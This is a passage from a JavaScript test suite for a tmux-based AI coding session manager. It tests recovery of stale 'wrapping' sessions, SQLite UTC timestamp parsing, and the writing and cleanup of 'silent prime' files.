        assert.match(body, /^version: 0\.1\.0$/m);
        assert.match(body, /^source: package\.json$/m);
        assert.match(body, /^recorded_at: \d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/m);
      } finally {
        // Test isolation (Critic MINOR): leaving the seeded package.json behind
        // would let the next test in this suite hit a different detection layer.
        try { fs.rmSync(seededPkgPath, { force: true }); } catch {}
        try { fs.rmSync(cachePath, { force: true }); } catch {}
        try { fs.rmSync(path.dirname(cachePath), { recursive: true, force: true }); } catch {}
      }
    });
  });

  describe('launchSession stale wrapping recovery (#105)', () => {
    const tmux = require('../lib/tmux');
    const enginesModule = require('../lib/engines');
    let sessions;
    let originalHasSession;
    let originalDetectEngine;
    let originalKillSession;
    let originalCreateSession;
    let killedTmux;

    before(() => {
      sessions = require('../lib/sessions');
      // Project for launch-guard tests
      const projDir = path.join(projectsDir, 'stale-wrap');
      fs.mkdirSync(projDir, { recursive: true });
      store.projects.create({
        name: 'stale-wrap',
        path: projDir,
        engine: 'claude'
      });
    });

    let originalProbeSession;

    beforeEach(() => {
      originalHasSession = tmux.hasSession;
      originalDetectEngine = enginesModule.detectEngine;
      originalKillSession = tmux.killSession;
      originalCreateSession = tmux.createSession;
      originalProbeSession = tmux.probeSession;
      killedTmux = [];
      tmux.killSession = (name) => { killedTmux.push(name); };
      tmux.createSession = () => true;
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });
    });

    afterEach(() => {
      tmux.hasSession = originalHasSession;
      tmux.killSession = originalKillSession;
      tmux.createSession = originalCreateSession;
      tmux.probeSession = originalProbeSession;
      enginesModule.detectEngine = originalDetectEngine;
      const project = store.projects.getByName('stale-wrap');
      if (project) {
        const wrapping = store.sessions.getWrapping(project.id);
        if (wrapping) store.sessions.kill(wrapping.id, 'test cleanup');
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
      }
    });

    /**
     * Force a session row's wrap_started_at to a past timestamp (simulating a
     * wrap that has been stuck for `hoursAgo` hours). Uses store.getDb()
     * directly since there is no public mutator for this column — appropriate
     * here because the field is otherwise managed exclusively by setWrapping.
     */
    function _backdateWrapStart(sessionId, hoursAgo) {
      const db = store.getDb();
      db.prepare(`UPDATE sessions SET wrap_started_at = datetime('now', ?) WHERE id = ?`)
        .run(`-${hoursAgo} hours`, sessionId);
    }

    function _backdateStartedAt(sessionId, hoursAgo) {
      const db = store.getDb();
      db.prepare(`UPDATE sessions SET started_at = datetime('now', ?) WHERE id = ?`)
        .run(`-${hoursAgo} hours`, sessionId);
    }

    function _clearWrapStart(sessionId) {
      const db = store.getDb();
      db.prepare('UPDATE sessions SET wrap_started_at = NULL WHERE id = ?').run(sessionId);
    }

    it('recovers stale wrapping row (>1h) and proceeds with fresh launch', () => {
      const project = store.projects.getByName('stale-wrap');
      // Distinct tmux name on the wrapping row so the recovery-kill is
      // distinguishable from the pre-launch orphan-kill that fires later in
      // launchSession against the project's canonical tmux name (Critic MINOR).
      const stale = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'stale-wrap-OLD'
      });
      store.sessions.setWrapping(stale.id);
      _backdateWrapStart(stale.id, 2); // wrap began 2h ago — well past threshold
      tmux.hasSession = (name) => name === 'stale-wrap-OLD' || name === 'stale-wrap';
      // Re-pointed from `hasSession` (#908): the wrapping path asks
      // `probeSession` now. Same meaning as before — this pane is ANSWERED live,
      // which is the case this test has always been about. A confirmed-DEAD pane
      // takes the auto-complete branch instead, which is pinned separately.
      tmux.probeSession = (name) => ({
        live: name === 'stale-wrap-OLD' || name === 'stale-wrap',
        answered: true,
        cause: null
      });

      const result = sessions.launchSession('stale-wrap');

      assert.equal(result.error, null, 'launch should proceed');
      assert.ok(result.session, 'fresh session should be created');
      assert.notEqual(result.session.id, stale.id, 'should be a new session row');
      assert.ok(killedTmux.includes('stale-wrap-OLD'),
        'stale wrapping tmux name should have been killed during recovery branch');

      // Original wrapping row should now be marked killed
      const recovered = store.sessions.list(project.id, { status: 'killed', limit: 5 })
        .find((s) => s.id === stale.id);
      assert.ok(recovered, 'stale row should be marked killed');
      assert.equal(recovered.status, 'killed');
    });

    it('falls back to recovery (not block) when timestamps are unparseable', () => {
      // Defense for MINOR 5: a wrapping row with corrupt timestamps must not
      // brick the project. Fail-safe direction is "recover" since that's the
      // entire bug class #105 was filed for.
      const project = store.projects.getByName('stale-wrap');
      const corrupt = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'corrupt-wrap'
      });
      store.sessions.setWrapping(corrupt.id);
      const db = store.getDb();
      db.prepare("UPDATE sessions SET wrap_started_at = '<not a date>', started_at = '<not a date>' WHERE id = ?")
        .run(corrupt.id);
      tmux.hasSession = () => true;

      const result = sessions.launchSession('stale-wrap');
      assert.equal(result.error, null, 'corrupt timestamps must not block launch');
      assert.ok(result.session);
    });

    it('blocks launch when wrapping row is recent (<1h) and tmux is alive', () => {
      const project = store.projects.getByName('stale-wrap');
      const recent = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'recent-wrap'
      });
      store.sessions.setWrapping(recent.id);
      // wrap_started_at defaults to now (just set by setWrapping) — well within threshold
      // Re-pointed from `hasSession` to `probeSession` (#908): an ANSWERED
      // liveness of true, which is what the old stub meant.
      tmux.probeSession = (name) => ({
        live: name === 'recent-wrap', answered: true, cause: null
      });

      const result = sessions.launchSession('stale-wrap');

      assert.equal(result.session, null);
      assert.ok(result.error.includes('currently wrapping'));
      assert.deepEqual(killedTmux, [], 'recent wrap should not be killed');
    });

    it('falls back to started_at for legacy rows with NULL wrap_started_at', () => {
      // Legacy row predates schema v14 — wrap_started_at is NULL but the row
      // is in wrapping status with an old started_at. Should still recover.
      const project = store.projects.getByName('stale-wrap');
      const legacy = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'legacy-wrap-OLD'
      });
      store.sessions.setWrapping(legacy.id);
      _clearWrapStart(legacy.id);
      _backdateStartedAt(legacy.id, 3); // started 3h ago
      tmux.hasSession = (name) => name === 'legacy-wrap-OLD' || name === 'stale-wrap';
      // Re-pointed from `hasSession` (#908), same meaning: an ANSWERED live pane.
      tmux.probeSession = (name) => ({
        live: name === 'legacy-wrap-OLD' || name === 'stale-wrap',
        answered: true,
        cause: null
      });

      const result = sessions.launchSession('stale-wrap');

      assert.equal(result.error, null, 'legacy stale row should be recovered too');
      assert.ok(result.session);
      assert.notEqual(result.session.id, legacy.id);
      assert.ok(killedTmux.includes('legacy-wrap-OLD'),
        'legacy stale tmux name should have been killed during recovery');
    });

    it('STALE_WRAPPING_THRESHOLD_MS is 1 hour', () => {
      assert.equal(sessions.STALE_WRAPPING_THRESHOLD_MS, 60 * 60 * 1000);
    });

    it('setWrapping populates wrap_started_at on transition (schema v14)', () => {
      const project = store.projects.getByName('stale-wrap');
      const session = store.sessions.start({
        projectId: project.id,
        engineId: 'claude',
        tmuxSession: 'set-wrapping-timestamp'
      });
      const wrapped = store.sessions.setWrapping(session.id);
      assert.ok(wrapped, 'setWrapping should return updated row');
      assert.equal(wrapped.status, 'wrapping');
      assert.ok(wrapped.wrapStartedAt, 'wrap_started_at should be populated');
      // Should be within the last few seconds. Parse as UTC since SQLite emits
      // a TZ-less string and the test machine may not be in UTC.
      const ageMs = Date.now() - sessions._parseSqliteUtcMs(wrapped.wrapStartedAt);
      assert.ok(ageMs < 5000, `wrap_started_at should be very recent (got ageMs=${ageMs})`);
      assert.ok(ageMs >= 0, `wrap_started_at should not be in the future (got ageMs=${ageMs})`);
    });

    it('_parseSqliteUtcMs interprets TZ-less SQLite timestamps as UTC', () => {
      // SQLite emits 'YYYY-MM-DD HH:MM:SS' without timezone — should parse as UTC.
      const tzLess = '2026-04-29 05:00:00';
      const withZ = '2026-04-29T05:00:00Z';
      assert.equal(sessions._parseSqliteUtcMs(tzLess), Date.parse(withZ));
      // Also handle inputs that already have Z or offset
      assert.equal(sessions._parseSqliteUtcMs(withZ), Date.parse(withZ));
      assert.ok(Number.isNaN(sessions._parseSqliteUtcMs(null)));
      assert.ok(Number.isNaN(sessions._parseSqliteUtcMs('')));
    });
  });

  describe('silent prime delivery (#103)', () => {
    const tmux = require('../lib/tmux');
    const enginesModule = require('../lib/engines');
    let sessions;
    let originalHasSession;
    let originalDetectEngine;

    before(() => {
      sessions = require('../lib/sessions');
      const projDir = path.join(projectsDir, 'silent-prime-test');
      fs.mkdirSync(projDir, { recursive: true });
      store.projects.create({
        name: 'silent-prime-test',
        path: projDir,
        engine: 'claude'
      });
    });

    beforeEach(() => {
      originalHasSession = tmux.hasSession;
      originalDetectEngine = enginesModule.detectEngine;
    });

    afterEach(() => {
      tmux.hasSession = originalHasSession;
      enginesModule.detectEngine = originalDetectEngine;
      const project = store.projects.getByName('silent-prime-test');
      if (project) {
        const active = store.sessions.getActive(project.id);
        if (active) store.sessions.kill(active.id, 'test cleanup');
        // Clean up prime file + project config so each test starts fresh
        try { fs.rmSync(path.join(project.path, '.tangleclaw'), { recursive: true, force: true }); } catch {}
      }
      // Real tmux session may have been spawned by launchSession — clean it up
      // so the next test starts without leftover state.
      try { require('node:child_process').execSync('tmux kill-session -t silent-prime-test 2>/dev/null', { stdio: 'ignore' }); } catch {}
    });

    it('_writePrimeFile creates .tangleclaw/session-prime.md and returns its path', () => {
      const project = store.projects.getByName('silent-prime-test');
      const out = sessions._writePrimeFile(project.path, '# prime\nbody line\n');
      const expected = path.join(project.path, '.tangleclaw', 'session-prime.md');
      assert.equal(out, expected);
      assert.equal(fs.readFileSync(expected, 'utf8'), '# prime\nbody line\n');
    });

    it('_writePrimeFile creates .tangleclaw/ directory when missing', () => {
      const project = store.projects.getByName('silent-prime-test');
      const tcDir = path.join(project.path, '.tangleclaw');
      try { fs.rmSync(tcDir, { recursive: true, force: true }); } catch {}
      assert.equal(fs.existsSync(tcDir), false, 'precondition: .tangleclaw missing');

      sessions._writePrimeFile(project.path, 'body');

      assert.equal(fs.existsSync(tcDir), true);
      assert.equal(fs.existsSync(path.join(tcDir, 'session-prime.md')), true);
    });

    it('_writePrimeFile returns null when the path is unwritable (non-throwing)', () => {
      // Pass a path that cannot be created (parent is a file, not a dir).
      const fakeProject = path.join(projectsDir, 'silent-prime-not-a-dir');
      try { fs.rmSync(fakeProject, { force: true, recursive: true }); } catch {}
      fs.writeFileSync(fakeProject, 'i am a file, not a project');
      try {
        const out = sessions._writePrimeFile(fakeProject, 'body');
        assert.equal(out, null);
      } finally {
        fs.rmSync(fakeProject, { force: true });
      }
    });

    it('launchSession writes prime file when projConfig.silentPrime is true', () => {
      // Mirror the orphan-adoption pattern from the launchSession tests above:
      // pretend a tmux session exists so launchSession kills+recreates rather
      // than failing on whatever stale tmux state may exist on the test host.
      tmux.hasSession = (name) => name === 'silent-prime-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const project = store.projects.getByName('silent-prime-test');
      // Enable silentPrime via project config
      store.projectConfig.save(project.path, {
        engine: 'claude',
        silentPrime: true
      });

      const result = sessions.launchSession('silent-prime-test');
      assert.equal(result.error, null);

      const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
      assert.equal(fs.existsSync(primeFile), true, 'prime file should be written');
      assert.ok(fs.readFileSync(primeFile, 'utf8').length > 0, 'prime file should be non-empty');
    });

    it('launchSession does NOT write prime file when silentPrime is explicitly false', () => {
      // Mirror the orphan-adoption pattern from the launchSession tests above:
      // pretend a tmux session exists so launchSession kills+recreates rather
      // than failing on whatever stale tmux state may exist on the test host.
      tmux.hasSession = (name) => name === 'silent-prime-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const project = store.projects.getByName('silent-prime-test');
      // Explicit silentPrime=false — post-#129 the default is true, so the
      // test now has to be explicit about the silent-off state it's testing.
      store.projectConfig.save(project.path, {
        engine: 'claude',
        silentPrime: false
      });
      const result = sessions.launchSession('silent-prime-test');
      assert.equal(result.error, null);

      const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
      assert.equal(fs.existsSync(primeFile), false, 'prime file should not be written when silent is off');
    });

    it('launchSession does NOT write prime file when engine lacks supportsSilentPrime capability', () => {
      // Stub the claude engine profile to drop the supportsSilentPrime capability,
      // then assert silentPrime=true in projConfig is ignored gracefully.
      // Mirror the orphan-adoption pattern from the launchSession tests above:
      // pretend a tmux session exists so launchSession kills+recreates rather
      // than failing on whatever stale tmux state may exist on the test host.
      tmux.hasSession = (name) => name === 'silent-prime-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const project = store.projects.getByName('silent-prime-test');
      store.projectConfig.save(project.path, {
        engine: 'claude',
        silentPrime: true
      });

      // launchSession reads the engine profile via store.engines.get (not the
      // availability-enriched variant) — patch there so silentPrime resolves to false.
      const origGet = store.engines.get;
      store.engines.get = (id) => {
        const real = origGet(id);
        if (real && real.capabilities) {
          return { ...real, capabilities: { ...real.capabilities, supportsSilentPrime: false } };
        }
        return real;
      };
      try {
        const result = sessions.launchSession('silent-prime-test');
        assert.equal(result.error, null);
        const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
        assert.equal(fs.existsSync(primeFile), false,
          'engines without supportsSilentPrime should fall back to typed prime even if user opted in');
      } finally {
        store.engines.get = origGet;
      }
    });

    it('DEFAULT_PROJECT_CONFIG.silentPrime is true (#129 — soak satisfied)', () => {
      // Pre-#129 this was false (opt-in until proven stable). After ~2 weeks of
      // soak with no regressions, the default flipped to true. Projects that
      // explicitly persisted `silentPrime: false` continue to honor that; the
      // capability gate (`engineProfile.capabilities.supportsSilentPrime`)
      // protects non-Claude engines regardless of the default.
      const projDir = path.join(projectsDir, 'silentprime-default-check');
      fs.mkdirSync(projDir, { recursive: true });
      try {
        const cfg = store.projectConfig.load(projDir);
        assert.equal(cfg.silentPrime, true);
      } finally {
        fs.rmSync(projDir, { recursive: true, force: true });
      }
    });

    // ── Chunk 3: prime-file cleanup on silent→typed transition ──

    it('_removePrimeFile removes session-prime.md and returns true', () => {
      const project = store.projects.getByName('silent-prime-test');
      sessions._writePrimeFile(project.path, 'stale prime body');
      const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
      assert.equal(fs.existsSync(primeFile), true, 'precondition: prime file written');

      const result = sessions._removePrimeFile(project.path);
      assert.equal(result, true);
      assert.equal(fs.existsSync(primeFile), false, 'prime file should be gone');
    });

    it('_removePrimeFile returns false when prime file is absent (no-op)', () => {
      const project = store.projects.getByName('silent-prime-test');
      // Ensure the file does NOT exist
      const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
      try { fs.unlinkSync(primeFile); } catch {}

      const result = sessions._removePrimeFile(project.path);
      assert.equal(result, false);
    });

    it('_removePrimeFile is non-throwing when unlink itself fails (exercises catch arm)', () => {
      // Pre-fix Mn2 from final Critic: the original test passed a missing path
      // and exited via the `existsSync === false` branch, never reaching the
      // catch. Stub fs.unlinkSync to throw so we genuinely test the catch path.
      const project = store.projects.getByName('silent-prime-test');
      sessions._writePrimeFile(project.path, 'will be unlinked');
      const fs2 = require('node:fs');
      const original = fs2.unlinkSync;
      fs2.unlinkSync = () => { throw new Error('simulated EACCES'); };
      try {
        const result = sessions._removePrimeFile(project.path);
        assert.equal(result, false, 'returns false when unlink throws');
      } finally {
        fs2.unlinkSync = original;
        // Real cleanup so we don't leak the prime file into other tests.
        try { fs2.unlinkSync(path.join(project.path, '.tangleclaw', 'session-prime.md')); } catch {}
      }
    });

    it('launchSession removes stale prime file when silentPrime flips to false', () => {
      // The transition path: silentPrime was on (file exists), user toggles off,
      // next session launch should clean up the stale file so the SessionStart
      // hook (still installed) doesn't replay yesterday's prime.
      tmux.hasSession = (name) => name === 'silent-prime-test';
      enginesModule.detectEngine = () => ({ available: true, path: '/usr/bin/claude' });

      const project = store.projects.getByName('silent-prime-test');
      // Pre-seed a stale prime file (from a prior silent session)
      sessions._writePrimeFile(project.path, '# stale prime from yesterday\n');
      const primeFile = path.join(project.path, '.tangleclaw', 'session-prime.md');
      assert.equal(fs.existsSync(primeFile), true, 'precondition: stale file present');

      // silentPrime now false (the off-by-default config)
      store.projectConfig.save(project.path, {
        engine: 'claude',
        silentPrime: false
      });

      const result = sessions.launchSession('silent-prime-test');
      assert.equal(result.error, null);

      assert.equal(fs.existsSync(primeFile), false,
        'stale prime file should be removed when silentPrime is off');
    });
  });
});
